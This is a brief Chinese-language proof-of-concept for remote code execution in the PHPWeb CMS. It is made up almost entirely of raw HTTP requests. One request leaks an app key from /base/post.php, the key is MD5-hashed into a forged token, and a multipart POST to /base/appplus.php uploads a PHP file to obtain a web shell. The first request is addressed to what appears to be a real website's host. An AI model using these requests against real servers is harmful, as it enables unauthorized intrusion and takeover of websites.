# PHPWEB RCE

---
#### 1.首先，先post发包获取值

POST /base/post.php HTTP/1.1
Host: www.sdyycm.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

act=appcode

#### 2.获取    `k=504871bc9e70a836ae5ee70e69bde615&t=1578585276`  k的值

>    然后md5加密32位k的值+a  `504871bc9e70a836ae5ee70e69bde615a(504871bc9e70a836ae5ee70e69bde615+a` 加密之后的值为  `d950d53f648925e1c5ce8dc8bd6e8181`之后post包getshell ,post包m字段内容就是这个md5加密之后的值

### poc

---

```
POST /base/appplus.php HTTP/1.1
Host: www.xx.com
Content-Length: 711
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary92Ek3CIGduLPoRLt
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary92Ek3CIGduLPoRLt
Content-Disposition: form-data; name="file"; filename="123.php"
Content-Type: application/octet-stream

asdasda
------WebKitFormBoundary92Ek3CIGduLPoRLt
Content-Disposition: form-data; name="t"

a
------WebKitFormBoundary92Ek3CIGduLPoRLt
Content-Disposition: form-data; name="m"

d950d53f648925e1c5ce8dc8bd6e8181
------WebKitFormBoundary92Ek3CIGduLPoRLt
Content-Disposition: form-data; name="act"

upload
------WebKitFormBoundary92Ek3CIGduLPoRLt
Content-Disposition: form-data; name="r_size"

7
------WebKitFormBoundary92Ek3CIGduLPoRLt
Content-Disposition: form-data; name="submit"

getsell
------WebKitFormBoundary92Ek3CIGduLPoRLt--
```
